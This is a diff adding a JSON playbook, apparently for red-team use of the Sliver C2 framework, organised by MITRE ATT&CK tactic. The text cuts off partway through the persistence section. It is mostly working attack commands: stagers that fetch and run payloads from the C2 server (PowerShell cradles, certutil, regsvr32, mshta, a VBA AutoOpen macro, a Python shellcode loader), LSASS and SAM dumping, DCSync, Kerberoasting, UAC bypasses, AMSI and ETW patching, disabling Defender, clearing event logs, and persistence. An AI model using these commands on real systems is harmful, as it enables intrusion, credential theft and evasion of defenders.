@@ -1,0 +1,963 @@
+{
+  "server_setup_and_infrastructure": {
+    "description": "Sliver C2 server installation, multiplayer operator management, Docker deployment, redirector configuration, and team server hardening.",
+    "mitre": "T1583.003",
+    "commands": [
+      {
+        "description": "Install Sliver server on Linux via official quick-install script.",
+        "method": "Bash",
+        "command": "curl https://sliver.sh/install | sudo bash"
+      },
+      {
+        "description": "Manual install \u2014 download latest server binary from GitHub releases.",
+        "method": "Bash",
+        "command": "wget -O sliver-server https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux\nchmod +x sliver-server && sudo mv sliver-server /usr/local/bin/"
+      },
+      {
+        "description": "Start Sliver in foreground interactive mode.",
+        "method": "Sliver Server",
+        "command": "sudo sliver-server"
+      },
+      {
+        "description": "Start Sliver as a background daemon (production deployments).",
+        "method": "Sliver Server",
+        "command": "sudo sliver-server daemon"
+      },
+      {
+        "description": "Deploy Sliver in Docker with persistent config volume.",
+        "method": "Docker",
+        "command": "docker pull bishopfox/sliver\ndocker run -it --rm \\\n  -v $(pwd)/sliver-data:/root/.sliver \\\n  -p 443:443 -p 80:80 -p 8888:8888 \\\n  bishopfox/sliver"
+      },
+      {
+        "description": "Create operator config for multiplayer team server access.",
+        "method": "Sliver Server Console",
+        "command": "new-operator --name {operator_name} --lhost {team_server_ip}\n# Outputs: {operator_name}.cfg \u2014 share securely with the operator"
+      },
+      {
+        "description": "Import operator config on the operator machine.",
+        "method": "Sliver Client",
+        "command": "sliver import {operator_name}.cfg\nsliver"
+      },
+      {
+        "description": "List all connected operators in the current multiplayer session.",
+        "method": "Sliver Console",
+        "command": "operators"
+      },
+      {
+        "description": "Install all armory packages \u2014 BOFs, .NET assemblies, and aliases.",
+        "method": "Sliver Console",
+        "command": "armory install all"
+      },
+      {
+        "description": "Install targeted armory packages for offensive operations.",
+        "method": "Sliver Console",
+        "command": "armory install situational-awareness\narmory install nanodump\narmory install mimikatz\narmory install BOF-Collection\narmory install sharp-hound-4\narmory install Rubeus"
+      },
+      {
+        "description": "Configure HTTPS redirector with Nginx \u2014 hides real C2 IP behind a VPS.",
+        "method": "Nginx (Redirector VPS)",
+        "command": "# /etc/nginx/sites-available/redirector.conf\nserver {\n  listen 443 ssl;\n  server_name {redirector_domain};\n  ssl_certificate /etc/letsencrypt/live/{redirector_domain}/fullchain.pem;\n  ssl_certificate_key /etc/letsencrypt/live/{redirector_domain}/privkey.pem;\n  location / {\n    proxy_pass https://{real_c2_ip}:443;\n    proxy_ssl_verify off;\n    proxy_set_header Host $host;\n    proxy_set_header X-Forwarded-For $remote_addr;\n  }\n}"
+      },
+      {
+        "description": "Configure Apache mod_rewrite redirector \u2014 only relay Sliver beacon traffic.",
+        "method": "Apache (Redirector VPS)",
+        "command": "# .htaccess or VirtualHost:\nRewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} \"Mozilla/5.0 (Windows NT)\" [NC]\nRewriteRule ^(.*)$ https://{real_c2_ip}:443$1 [P,L]\n# All other requests serve decoy content or 404"
+      },
+      {
+        "description": "Configure Sliver DNS C2 \u2014 create NS record pointing to your server.",
+        "method": "DNS Config",
+        "command": "# In your DNS provider:\n# A    c2.yourdomain.com    \u2192 {sliver_server_ip}\n# NS   agents.yourdomain.com \u2192 c2.yourdomain.com\n# Then start DNS listener:\ndns -d agents.yourdomain.com"
+      }
+    ],
+    "prerequisites": "Sliver binary; VPS/server; multiplayer mode for team use",
+    "opsec": "Sliver MTLS and WireGuard transports are more stealthy than HTTP/HTTPS. Use named pipes for intranet pivots. Rotate operator certificates per engagement.",
+    "detection_ref": "Sliver TLS certificate fingerprints; default sliver ports (31337); binary signatures in open-source detection rules"
+  },
+  "listener_configuration": {
+    "description": "Configuring all Sliver listener types \u2014 HTTPS, HTTP, mTLS, DNS, WireGuard, and named-pipe \u2014 for beacon and session callbacks across varied network environments.",
+    "mitre": "T1071",
+    "commands": [
+      {
+        "description": "Start HTTPS listener on port 443 (self-signed cert).",
+        "method": "Sliver Console",
+        "command": "https -l 0.0.0.0 -p 443"
+      },
+      {
+        "description": "Start HTTPS listener with custom domain cert for TLS legitimacy.",
+        "method": "Sliver Console",
+        "command": "https -l 0.0.0.0 -p 443 \\\n  --cert /etc/letsencrypt/live/{domain}/fullchain.pem \\\n  --key /etc/letsencrypt/live/{domain}/privkey.pem \\\n  --domain {domain}"
+      },
+      {
+        "description": "Start HTTP listener \u2014 for redirector-terminated TLS or internal testing.",
+        "method": "Sliver Console",
+        "command": "http -l 0.0.0.0 -p 80"
+      },
+      {
+        "description": "Start HTTP listener with custom camouflage website.",
+        "method": "Sliver Console",
+        "command": "http -l 0.0.0.0 -p 80 --website {website_name}"
+      },
+      {
+        "description": "Start mTLS listener \u2014 mutual certificate auth, strongest option.",
+        "method": "Sliver Console",
+        "command": "mtls -l 0.0.0.0 -p 8888"
+      },
+      {
+        "description": "Start DNS C2 listener for covert callback through DNS.",
+        "method": "Sliver Console",
+        "command": "dns -d {c2_domain} -l 0.0.0.0\n# Requires NS record: {c2_domain} \u2192 this server"
+      },
+      {
+        "description": "Start WireGuard listener for VPN-tunnel-based C2.",
+        "method": "Sliver Console",
+        "command": "wg -l 0.0.0.0 -p 51820"
+      },
+      {
+        "description": "Host implant file via built-in HTTPS website for payload delivery.",
+        "method": "Sliver Console",
+        "command": "websites add-content --website lure \\\n  --web-path /update.exe \\\n  --content /tmp/beacon.exe \\\n  --content-type application/octet-stream\nhttps -l 0.0.0.0 -p 443 -w lure"
+      },
+      {
+        "description": "Configure stage-listener to serve shellcode to a separate dropper.",
+        "method": "Sliver Console",
+        "command": "stage-listener \\\n  --url http://{c2_server}:8443 \\\n  --profile {beacon_profile_name}"
+      },
+      {
+        "description": "List all active listener jobs.",
+        "method": "Sliver Console",
+        "command": "jobs"
+      },
+      {
+        "description": "Kill a specific listener by job ID.",
+        "method": "Sliver Console",
+        "command": "jobs -k {job_id}"
+      }
+    ],
+    "prerequisites": "Sliver server running; mTLS certificates generated; port accessible",
+    "opsec": "Use mTLS or WireGuard listeners for encrypted, certificate-pinned C2. Domain fronting for HTTPS listeners. Rotate infrastructure between engagements.",
+    "detection_ref": "Sliver default port detection; TLS certificate fingerprinting; mTLS anomaly detection; C2 framework signatures"
+  },
+  "implant_generation": {
+    "description": "Generating Sliver beacon and session implants for Windows, Linux, and macOS in all formats \u2014 EXE, DLL, shellcode \u2014 with evasion, jitter, and multi-protocol options.",
+    "mitre": "T1587.001",
+    "commands": [
+      {
+        "description": "Generate Windows HTTPS beacon EXE \u2014 periodic check-in, low footprint.",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --http {c2_server}:443 \\\n  --os windows --arch amd64 \\\n  --format exe \\\n  --save /tmp/beacon.exe"
+      },
+      {
+        "description": "Generate Windows mTLS beacon \u2014 strongest channel, cert auth.",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --mtls {c2_server}:8888 \\\n  --os windows --arch amd64 \\\n  --format exe \\\n  --save /tmp/beacon_mtls.exe"
+      },
+      {
+        "description": "Generate Windows DNS beacon \u2014 covert callback through DNS.",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --dns {c2_domain} \\\n  --os windows --arch amd64 \\\n  --format exe \\\n  --save /tmp/dns_beacon.exe"
+      },
+      {
+        "description": "Generate Windows beacon as raw shellcode for process injection.",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --http {c2_server}:443 \\\n  --os windows --arch amd64 \\\n  --format shellcode \\\n  --save /tmp/beacon.bin"
+      },
+      {
+        "description": "Generate Windows DLL implant for sideloading delivery.",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --http {c2_server}:443 \\\n  --os windows --arch amd64 \\\n  --format shared \\\n  --save /tmp/implant.dll"
+      },
+      {
+        "description": "Generate implant with evasion flags (symbol stripping, obfuscation).",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --mtls {c2_server}:8888 \\\n  --os windows --arch amd64 \\\n  --evasion \\\n  --format exe \\\n  --save /tmp/evasive.exe"
+      },
+      {
+        "description": "Generate long-haul low-noise beacon (8h interval, 15min jitter).",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --http {c2_server}:443 \\\n  --os windows --arch amd64 \\\n  --seconds 28800 --jitter 900 \\\n  --name LONGHAUL \\\n  --format exe \\\n  --save /tmp/longhaul.exe"
+      },
+      {
+        "description": "Generate Linux beacon for compromised Linux pivot host.",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --http {c2_server}:443 \\\n  --os linux --arch amd64 \\\n  --format exe \\\n  --save /tmp/beacon_linux"
+      },
+      {
+        "description": "Generate macOS beacon \u2014 Intel and Apple Silicon variants.",
+        "method": "Sliver Console",
+        "command": "generate beacon \\\n  --http {c2_server}:443 \\\n  --os mac --arch amd64 \\\n  --format exe --save /tmp/beacon_macos\n\ngenerate beacon \\\n  --http {c2_server}:443 \\\n  --os mac --arch arm64 \\\n  --format exe --save /tmp/beacon_macos_arm"
+      },
+      {
+        "description": "Save implant config as reusable profile.",
+        "method": "Sliver Console",
+        "command": "profiles new beacon \\\n  --http {c2_server}:443 \\\n  --os windows --arch amd64 \\\n  --seconds 60 --jitter 20 \\\n  --name win-https-60s"
+      },
+      {
+        "description": "Regenerate implant from saved profile.",
+        "method": "Sliver Console",
+        "command": "profiles generate \\\n  --name win-https-60s \\\n  --save /tmp/regen.exe"
+      },
+      {
+        "description": "Generate PowerShell stager (stage-1) that pulls beacon into memory.",
+        "method": "Sliver Console",
+        "command": "generate stager \\\n  --lhost {c2_server} --lport 443 \\\n  --protocol https \\\n  --os windows \\\n  --format powershell \\\n  --save /tmp/stager.ps1"
+      },
+      {
+        "description": "List all generated implant profiles.",
+        "method": "Sliver Console",
+        "command": "implants\nprofiles"
+      }
+    ],
+    "prerequisites": "Active Sliver server and listener; target OS/arch determined",
+    "opsec": "Generate with --os and --arch flags. Use --canary for internal domain keying. Sliver implants are increasingly signatured \u2014 recompile with custom symbols.",
+    "detection_ref": "Static Sliver binary signatures; Go binary analysis; certificate pinning bypass detection; entropy analysis"
+  },
+  "initial_access_and_delivery": {
+    "description": "Delivering Sliver implants via phishing, LOLBins, ISO/LNK smuggling, macro documents, and web drive-by to gain initial foothold.",
+    "mitre": "T1566",
+    "commands": [
+      {
+        "description": "PowerShell download cradle \u2014 pull and execute stager in memory (fileless).",
+        "method": "PowerShell",
+        "command": "powershell -w hidden -nop -c \\\n  \"IEX(New-Object Net.WebClient).DownloadString('https://{c2_server}/s.ps1')\""
+      },
+      {
+        "description": "Certutil LOLBin \u2014 download beacon via trusted Windows binary.",
+        "method": "certutil",
+        "command": "certutil -urlcache -split -f https://{c2_server}/update.exe %TEMP%\\svc.exe\n%TEMP%\\svc.exe"
+      },
+      {
+        "description": "Regsvr32 Squiblydoo \u2014 execute remote SCT scriptlet (AppLocker bypass).",
+        "method": "regsvr32",
+        "command": "regsvr32 /s /n /u /i:https://{c2_server}/payload.sct scrobj.dll"
+      },
+      {
+        "description": "mshta execution \u2014 load HTA file from URL.",
+        "method": "mshta",
+        "command": "mshta.exe https://{c2_server}/payload.hta"
+      },
+      {
+        "description": "msiexec \u2014 download and execute remote MSI silently.",
+        "method": "msiexec",
+        "command": "msiexec /q /i https://{c2_server}/update.msi"
+      },
+      {
+        "description": "ISO + LNK delivery \u2014 bypass MOTW for macro-less execution.",
+        "method": "ISO/LNK",
+        "command": "# LNK shell command:\ncmd /c powershell -w hidden -c \\\n  \"iwr https://{c2_server}/s.ps1 | iex\"\n# Package:\nmkisofs -o payload.iso -J -r /tmp/iso_contents/"
+      },
+      {
+        "description": "VBA Office macro stager \u2014 AutoOpen pulls beacon into memory.",
+        "method": "VBA Macro",
+        "command": "Sub AutoOpen()\n  Dim o As Object\n  Set o = CreateObject(\"WScript.Shell\")\n  o.Run \"powershell -w hidden -nop -c iex(iwr \" & _\n    \"'https://{c2_server}/s.ps1' -UseBasicParsing).Content\", 0, False\nEnd Sub"
+      },
+      {
+        "description": "Bitsadmin LOLBin \u2014 BITS service transfer (trusted, evades some proxies).",
+        "method": "bitsadmin",
+        "command": "bitsadmin /transfer job /download /priority normal \\\n  https://{c2_server}/update.exe %TEMP%\\svc.exe\n%TEMP%\\svc.exe"
+      },
+      {
+        "description": "Python shellcode loader \u2014 ctypes in-memory exec of beacon shellcode.",
+        "method": "Python",
+        "command": "python3 -c \"\nimport urllib.request, ctypes\nsc = urllib.request.urlopen('https://{c2_server}/beacon.bin').read()\nbuf = ctypes.create_string_buffer(sc)\nVA = ctypes.windll.kernel32.VirtualAlloc\nVA.restype = ctypes.c_void_p\naddr = VA(None, len(buf), 0x3000, 0x40)\nctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(addr), buf, len(buf))\nctypes.windll.kernel32.CreateThread(None,0,ctypes.c_void_p(addr),None,0,None)\nimport time; time.sleep(99999)\""
+      },
+      {
+        "description": "WMIC remote execution \u2014 spawn implant on remote host without SMB.",
+        "method": "WMIC",
+        "command": "wmic /node:{target} process call create \\\n  \"powershell -w hidden -c iex(iwr 'https://{c2}/s.ps1').Content\""
+      },
+      {
+        "description": "Upload implant to target then execute it.",
+        "method": "Sliver Console",
+        "command": "upload /tmp/beacon.exe C:\\\\Windows\\\\Temp\\\\svc.exe\nexecute -o C:\\\\Windows\\\\Temp\\\\svc.exe"
+      },
+      {
+        "description": "Interact with beacon after first check-in \u2014 upgrade to interactive session.",
+        "method": "Sliver Console",
+        "command": "beacons\nuse {beacon_id}\ninteractive"
+      }
+    ],
+    "prerequisites": "Sliver implant generated; delivery vector available",
+    "opsec": "Generate implants with --os, --arch, and --canary flags. Sliver binary signatures are public \u2014 recompile. Use shellcode generation with Donut for in-memory delivery.",
+    "detection_ref": "EDR execution prevention; Sliver binary detection; shellcode execution monitoring; download reputation services"
+  },
+  "reconnaissance": {
+    "description": "Host profiling, process visibility, network context, and domain situational awareness from within the Sliver beacon using built-in commands and SA BOFs.",
+    "mitre": "T1592",
+    "commands": [
+      {
+        "description": "Get full host and implant context \u2014 OS, arch, hostname, PID, username.",
+        "method": "Sliver Console",
+        "command": "info"
+      },
+      {
+        "description": "Get current user token and all group memberships.",
+        "method": "Sliver Console",
+        "command": "whoami\nwhoami --groups"
+      },
+      {
+        "description": "List all running processes with owner, PID, PPID, and arch.",
+        "method": "Sliver Console",
+        "command": "ps\nps -e"
+      },
+      {
+        "description": "Get network interfaces, IPs, and active connections.",
+        "method": "Sliver Console",
+        "command": "ifconfig\nnetstat"
+      },
+      {
+        "description": "Run full situational-awareness BOF suite.",
+        "method": "Sliver BOF",
+        "command": "sa-whoami\nsa-netstat\nsa-arp\nsa-env\nsa-tasklist"
+      },
+      {
+        "description": "List filesystem contents on remote host.",
+        "method": "Sliver Console",
+        "command": "ls C:\\\\\nls C:\\\\Users\\\\{user}\\\\Desktop"
+      },
+      {
+        "description": "Read file contents directly (no download needed).",
+        "method": "Sliver Console",
+        "command": "cat C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\ncat C:\\\\Users\\\\{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt"
+      },
+      {
+        "description": "Enumerate environment variables \u2014 find tokens, creds, or paths.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c set"
+      },
+      {
+        "description": "Get installed software list.",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"Get-ItemProperty HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\* | Select DisplayName,DisplayVersion | Sort DisplayName\""
+      },
+      {
+        "description": "Enumerate mapped drives and network shares in use.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c \"net use\"\nexecute -o cmd /c \"net share\""
+      },
+      {
+        "description": "Get ARP table to discover other hosts in the same subnet.",
+        "method": "Sliver BOF",
+        "command": "arp"
+      },
+      {
+        "description": "Check for AV/EDR products installed on the host.",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select displayName,productState\""
+      }
+    ],
+    "prerequisites": "Active Sliver implant session; network visibility",
+    "opsec": "Use Sliver's built-in ifconfig, netstat, ping for low-noise enumeration. Execute external tools via execute or sideload.",
+    "detection_ref": "Sysmon network connection events; behavioral analysis of implant activity; EDR process tree anomalies"
+  },
+  "discovery_and_enumeration": {
+    "description": "Active Directory, network, and local discovery \u2014 LDAP queries, port scanning, BloodHound collection, session hunting, and trust mapping.",
+    "mitre": "T1087",
+    "commands": [
+      {
+        "description": "Enumerate AD users via Sliver built-in LDAP.",
+        "method": "Sliver Console",
+        "command": "ldap users"
+      },
+      {
+        "description": "Enumerate AD groups.",
+        "method": "Sliver Console",
+        "command": "ldap groups"
+      },
+      {
+        "description": "Enumerate AD computers.",
+        "method": "Sliver Console",
+        "command": "ldap computers"
+      },
+      {
+        "description": "Query domain password policy.",
+        "method": "Sliver Console",
+        "command": "ldap pwdpol"
+      },
+      {
+        "description": "Internal port scan from within the beacon.",
+        "method": "Sliver Console",
+        "command": "portscan \\\n  --targets {target_range} \\\n  --ports 22,80,443,445,3389,1433,3306,5985,5986,8080"
+      },
+      {
+        "description": "Live host discovery via PowerShell ping sweep.",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"1..254 | % { if(Test-Connection -Count 1 -Quiet '10.10.10.$_') { '10.10.10.$_' } }\""
+      },
+      {
+        "description": "Run SharpHound to collect BloodHound attack path data.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/SharpHound.exe \\\n  -c All --outputdirectory C:\\\\Windows\\\\Temp\\"
+      },
+      {
+        "description": "Enumerate Domain Admins group members.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c \"net group \\\"Domain Admins\\\" /domain\""
+      },
+      {
+        "description": "Find logged-on DA sessions on remote hosts.",
+        "method": "Sliver BOF",
+        "command": "netsession {target_ip}"
+      },
+      {
+        "description": "Enumerate shares on a remote target.",
+        "method": "Sliver BOF",
+        "command": "net-share {target_hostname}"
+      },
+      {
+        "description": "List all domain trusts.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c \"nltest /domain_trusts\""
+      },
+      {
+        "description": "Find unconstrained delegation computers (TGT theft targets).",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/PowerView.exe \"Get-DomainComputer -Unconstrained | Select dnshostname\""
+      },
+      {
+        "description": "Search for sensitive files across the filesystem.",
+        "method": "Sliver Console",
+        "command": "ls -r C:\\\\Users\\ --filter \"*.kdbx,*.pfx,*.pem,*.key,*.config,*.bak\"\nls -r C:\\\\inetpub\\ --filter \"web.config,*.xml\""
+      }
+    ],
+    "prerequisites": "Active implant; domain access or local enumeration capability",
+    "opsec": "execute-assembly for .NET tools in memory. Shell commands for built-in Windows/Linux commands. Avoid dropping enum tools to disk.",
+    "detection_ref": "In-memory .NET assembly execution detection; script block logging; LDAP enumeration patterns"
+  },
+  "credential_access": {
+    "description": "Credential dumping, Kerberos ticket attacks, DPAPI decryption, and plaintext credential harvesting via Sliver BOFs and execute-assembly.",
+    "mitre": "T1552",
+    "commands": [
+      {
+        "description": "Dump LSASS in-process via Mimikatz BOF (no fork-and-run IOC).",
+        "method": "Sliver BOF",
+        "command": "mimikatz \"sekurlsa::logonpasswords\" \"exit\""
+      },
+      {
+        "description": "Dump LSASS via execute-assembly Mimikatz.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/mimikatz.exe \"sekurlsa::logonpasswords\" \"exit\""
+      },
+      {
+        "description": "Dump LSASS with NanoDump BOF \u2014 EDR-evasive, custom minidump format.",
+        "method": "Sliver BOF",
+        "command": "nanodump --pid {lsass_pid} --write C:\\\\Windows\\\\Temp\\\\lsass.dmp\ndownload C:\\\\Windows\\\\Temp\\\\lsass.dmp"
+      },
+      {
+        "description": "Dump LSASS via built-in procdump.",
+        "method": "Sliver Console",
+        "command": "procdump -n lsass.exe -s /tmp/lsass.dmp"
+      },
+      {
+        "description": "Dump SAM + SYSTEM hive for offline NTLM cracking.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c \"reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam.hive /y\"\nexecute -o cmd /c \"reg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\sys.hive /y\"\ndownload C:\\\\Windows\\\\Temp\\\\sam.hive\ndownload C:\\\\Windows\\\\Temp\\\\sys.hive\n# Crack: secretsdump.py -sam sam.hive -system sys.hive LOCAL"
+      },
+      {
+        "description": "DCSync \u2014 pull all domain hashes without touching LSASS.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/mimikatz.exe \"lsadump::dcsync /domain:{domain} /all /csv\" \"exit\""
+      },
+      {
+        "description": "Kerberoast all SPN accounts via Rubeus.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/Rubeus.exe kerberoast /outfile:C:\\\\Windows\\\\Temp\\\\hashes.txt /nowrap\ndownload C:\\\\Windows\\\\Temp\\\\hashes.txt\n# Crack: hashcat -m 13100 hashes.txt wordlist.txt"
+      },
+      {
+        "description": "AS-REP roast accounts with pre-auth disabled.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/Rubeus.exe asreproast /format:hashcat /outfile:C:\\\\Windows\\\\Temp\\\\asrep.txt\n# Crack: hashcat -m 18200 asrep.txt wordlist.txt"
+      },
+      {
+        "description": "Dump Windows Credential Manager via BOF.",
+        "method": "Sliver BOF",
+        "command": "credman"
+      },
+      {
+        "description": "Dump Chrome saved passwords via DPAPI.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/SharpChrome.exe logins /unprotect"
+      },
+      {
+        "description": "Dump all Kerberos tickets from memory.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/Rubeus.exe dump /nowrap"
+      },
+      {
+        "description": "Read LSA secrets \u2014 cached domain creds, DPAPI machine key.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/mimikatz.exe \"lsadump::secrets\" \"exit\""
+      },
+      {
+        "description": "Search filesystem for hardcoded credentials in config files.",
+        "method": "Sliver Console",
+        "command": "grep -r \"password\" C:\\\\inetpub\\ --include=\"*.config\"\ngrep -r \"api_key\\|secret\\|AKIA\" C:\\\\Users\\ --include=\"*.ps1\""
+      }
+    ],
+    "prerequisites": "Admin/root access; target credential stores",
+    "opsec": "Use execute-assembly for Mimikatz/SharpDump rather than running binary directly. Minidump via comsvcs.dll for indirect LSASS access.",
+    "detection_ref": "LSASS access monitoring; Mimikatz behavioral detection; credential dumping via unusual processes"
+  },
+  "privilege_escalation": {
+    "description": "Local and domain privilege escalation \u2014 token stealing, potato attacks, UAC bypass, service abuse, and Kerberos privilege escalation via Sliver.",
+    "mitre": "T1548",
+    "commands": [
+      {
+        "description": "Check current token privileges.",
+        "method": "Sliver BOF",
+        "command": "getprivs"
+      },
+      {
+        "description": "Get SYSTEM via GodPotato (works Windows 2012\u20132022 with SeImpersonate).",
+        "method": "Sliver Console",
+        "command": "upload /opt/tools/GodPotato.exe C:\\\\Windows\\\\Temp\\\\gp.exe\nexecute -o C:\\\\Windows\\\\Temp\\\\gp.exe -cmd \"C:\\\\Windows\\\\Temp\\\\beacon_sys.exe\""
+      },
+      {
+        "description": "Get SYSTEM via PrintSpoofer (named pipe \u2014 IIS/service accounts).",
+        "method": "Sliver Console",
+        "command": "upload /opt/tools/PrintSpoofer.exe C:\\\\Windows\\\\Temp\\\\ps.exe\nexecute -o C:\\\\Windows\\\\Temp\\\\ps.exe -i -c C:\\\\Windows\\\\Temp\\\\beacon_sys.exe"
+      },
+      {
+        "description": "UAC bypass via fodhelper registry hijack.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c \"reg add HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command /d cmd.exe /f\"\nexecute -o cmd /c \"reg add HKCU\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command /v DelegateExecute /t REG_SZ /d \\\"\\\" /f\"\nexecute -o fodhelper.exe"
+      },
+      {
+        "description": "UAC bypass via eventvwr.exe MSC hijack.",
+        "method": "Sliver Console",
+        "command": "execute -o cmd /c \"reg add HKCU\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command /d C:\\\\Windows\\\\Temp\\\\beacon.exe /f\"\nexecute -o eventvwr.exe"
+      },
+      {
+        "description": "Run WinPEAS for automated local privesc enumeration.",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/winPEASany.exe"
+      },
+      {
+        "description": "Find and abuse unquoted service path.",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"Get-WmiObject Win32_Service | Where-Object {$_.PathName -notmatch '\\\"' -and $_.PathName -notmatch '^C:\\\\\\\\Windows'} | Select Name,PathName\"\n# Drop beacon to exploitable interim path and wait for service restart"
+      },
+      {
+        "description": "Replace writable service binary with beacon, restart service.",
+        "method": "Sliver Console",
+        "command": "upload /tmp/beacon_sys.exe \"C:\\\\VulnService\\\\service.exe\"\nexecute -o cmd /c \"sc stop {svc_name}\"\nexecute -o cmd /c \"sc start {svc_name}\""
+      },
+      {
+        "description": "NoPac domain escalation (CVE-2021-42278/42287).",
+        "method": "Sliver Console",
+        "command": "execute-assembly /opt/tools/noPac.exe \\\n  -domain {domain} -user {user} -pass {pass} \\\n  /dc {dc_ip} /mAccount FAKE$ /mPassword Fake123! \\\n  /service cifs /ptt"
+      },
+      {
+        "description": "Impersonate token of a target user by username.",
+        "method": "Sliver Console",
+        "command": "impersonate {domain}\\\\{user}\n# Revert:\nrevtoself"
+      },
+      {
+        "description": "RunAs with different credentials \u2014 pivots to another user context.",
+        "method": "Sliver Console",
+        "command": "runas -u {domain}\\\\{user} -p {password} -e C:\\\\Windows\\\\Temp\\\\beacon.exe"
+      }
+    ],
+    "prerequisites": "Low-privilege session; escalation path available",
+    "opsec": "Check current privileges with getuid/getpid. Use in-memory escalation tools via execute-assembly. Named pipe escalation if SeImpersonatePrivilege present.",
+    "detection_ref": "Privilege escalation behavioral patterns; token manipulation monitoring; UAC bypass detection"
+  },
+  "defense_evasion": {
+    "description": "Evading EDR, AV, and forensic tools via process injection, AMSI/ETW patching, memory stomping, log clearing, and implant obfuscation.",
+    "mitre": "T1574",
+    "commands": [
+      {
+        "description": "Migrate beacon into a legitimate process by PID.",
+        "method": "Sliver Console",
+        "command": "migrate --pid {target_pid}\n# Find targets: ps | grep -i explorer"
+      },
+      {
+        "description": "Inject Sliver shellcode into a remote process.",
+        "method": "Sliver Console",
+        "command": "inject --pid {target_pid} /tmp/beacon.bin"
+      },
+      {
+        "description": "Spawn sacrificial process and inject DLL beacon into it.",
+        "method": "Sliver Console",
+        "command": "spawndll --process notepad.exe /tmp/beacon.dll StartW"
+      },
+      {
+        "description": "Sideload DLL into a host process without writing to disk.",
+        "method": "Sliver Console",
+        "command": "sideload /tmp/payload.dll --entry-point DllMain"
+      },
+      {
+        "description": "Execute inline shellcode within current process (no fork).",
+        "method": "Sliver Console",
+        "command": "inline-execute /tmp/shellcode.bin"
+      },
+      {
+        "description": "Process-hollow a legitimate binary to host beacon (sacrificial process).",
+        "method": "Sliver Console",
+        "command": "execute-assembly --process notepad.exe /opt/tools/assembly.exe"
+      },
+      {
+        "description": "Patch AMSI in current process \u2014 allows unsigned PS script execution.",
+        "method": "Sliver BOF",
+        "command": "bypass-amsi"
+      },
+      {
+        "description": "Patch ETW to blind Defender telemetry.",
+        "method": "Sliver BOF",
+        "command": "etw-patch"
+      },
+      {
+        "description": "Unhook EDR user-mode hooks by reloading clean ntdll.dll.",
+        "method": "Sliver BOF",
+        "command": "unhook"
+      },
+      {
+        "description": "Stomp PE headers in beacon memory \u2014 hides from memory scanners.",
+        "method": "Sliver BOF",
+        "command": "pe-stomp --pid {beacon_pid}"
+      },
+      {
+        "description": "Disable Windows Defender real-time protection (requires local admin).",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"Set-MpPreference -DisableRealtimeMonitoring $true\""
+      },
+      {
+        "description": "Add Defender exclusion for beacon drop path.",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"Add-MpPreference -ExclusionPath 'C:\\\\Windows\\\\Temp'\""
+      },
+      {
+        "description": "Clear Windows Event Logs to remove forensic evidence.",
+        "method": "Sliver Console",
+        "command": "execute -o powershell \"Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }\""
+      },
+      {
+        "description": "Timestomp implant file to match OS file timestamps.",
+        "method": "Sliver Console",
+        "command": "chtimes C:\\\\Windows\\\\Temp\\\\svc.exe \"2023-01-15 08:30:00\" \"2023-01-15 08:30:00\""
+      }
+    ],
+    "prerequisites": "Active Sliver implant session; knowledge of target defenses",
+    "opsec": "Use Sliver's execute-assembly for .NET execution. Sideload for DLL injection. BYOL (Bring Your Own Land) approach for in-memory tool execution.",
+    "detection_ref": "Sysmon events for process injection; AMSI/ETW bypass detection; behavioral analysis of unexpected .NET CLR load events"
+  },
+  "persistence": {
+    "description": "Establishing durable access via registry, scheduled tasks, WMI subscriptions, service installation, startup folders, and AD-level backdoors.",
+    "mitre": "T1547",
+    "commands": [
+      {
+        "description": "Install registry Run key persistence via Sliver built-in module.",
+        "method": "Sliver Console",
+        "command": "persistence registry \\\n  --hive HKCU \\\n  --path \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" \\\n  --key WindowsUpdate"
+      },
+      {
+        "description": "Install Windows service persistence via Sliver built-in module.",
+        "method": "Sliver Console",
